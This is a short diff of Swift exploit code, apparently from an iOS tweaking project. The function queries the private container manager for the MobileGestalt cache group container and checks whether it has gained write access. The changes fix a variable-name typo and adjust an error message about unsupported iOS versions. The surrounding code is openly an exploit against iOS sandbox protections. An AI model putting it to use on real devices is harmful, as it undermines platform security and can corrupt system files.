@@ -45,7 +45,7 @@ func cmg() {
 
     let set_cls = load_sym(lib, "container_query_set_class", as: set_ui64_fn.self)
     let set_tran = load_sym(lib, "container_query_set_transient", as: set_bool_fn.self)
-    let sit_gids = load_sym(lib, "container_query_set_group_identifiers", as: set_obj_fn.self)
+    let set_gids = load_sym(lib, "container_query_set_group_identifiers", as: set_obj_fn.self)
     let set_plat = load_sym(lib, "container_query_operation_set_platform", as: set_ui64_fn.self)
     let set_flag = load_sym(lib, "container_query_operation_set_flags", as: set_ui64_fn.self)
     let set_part = load_sym(lib, "container_query_operation_set_part", fb: set_ui64_noop, as: set_ui64_fn.self)
@@ -60,7 +60,7 @@ func cmg() {
 
     let arr = xpc_array_create(nil, 0)
     xpc_array_set_string(arr, XPC_ARRAY_APPEND, "systemgroup.com.apple.mobilegestaltcache")
-    sit_gids(q, arr)
+    set_gids(q, arr)
 
     set_plat(q, 2)
     set_flag(q, (1 << 32) | (1 << 39))
@@ -86,7 +86,7 @@ func cmg() {
 
     if flags == -1 {
         print("(cmg) fcntl failed:", errno)
-        print("(cmg) exploit failed; is your iOS supported?")
+        print("(cmg)", is_supported() ? "exploit failed" : "exploit failed: unsupported iOS")
     } else {
         print("(cmg) fd flags:", flags)
         print("(cmg) write enabled:", (flags & O_ACCMODE) == O_WRONLY || (flags & O_ACCMODE) == O_RDWR)
